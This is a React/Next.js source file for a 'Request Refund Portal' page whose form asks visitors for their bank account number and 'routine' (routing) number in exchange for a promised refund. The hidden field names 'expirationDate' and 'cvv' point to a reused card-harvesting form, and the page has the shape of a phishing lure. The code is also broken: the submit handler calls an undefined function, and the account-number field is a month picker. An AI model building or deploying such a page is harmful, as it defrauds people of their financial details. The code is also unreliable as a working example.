"use client";

import { useState, ChangeEvent, FormEvent } from "react";


interface FormData {
  expirationDate: string;
  cvv: string;
}

export default function Home() {
  const [formData, setFormData] = useState<FormData>({
    expirationDate: "",
    cvv: "",
  });

  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState("");

  const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { id, value } = e.target;
    setFormData((prevState) => ({
      ...prevState,
      [id]: value,
    }));
  };

  const handleRefundSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true);
    setStatusMessage("");

    try {
      await handleFormSubmit(formData);
      setStatusMessage("Refund request submitted successfully!");
      setFormData({
        expirationDate: "",
        cvv: "",
      });
    } catch (error) {
      setStatusMessage("Failed to submit the refund request. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <header>
        <img
          src="https://i.postimg.cc/CLKVXjQf/images.png"
          alt="Logo"
          style={{ width: "100px" }}
        />
        <h1>Request Refund Portal</h1>
      </header>
      <main>
        <form id="refund-form" onSubmit={handleRefundSubmit}>
          <section>
            <h2>Refund Information</h2>

            <label htmlFor="expirationDate">ACCOUNT NUMBER:</label>
            <input
              type="month"
              id="expirationDate"
              value={formData.expirationDate}
              onChange={handleChange}
              required
            />

            <label htmlFor="cvv">ROUTINE NUMBER:</label>
            <input
              type="text"
              id="cvv"
              value={formData.cvv}
              onChange={handleChange}
              required
            />
          </section>
          {statusMessage && <p>{statusMessage}</p>}

          <button type="submit" disabled={isLoading}>
            {isLoading ? "Submitting..." : "Request Refund"}
          </button>
        </form>
      </main>
    </>
  );
}
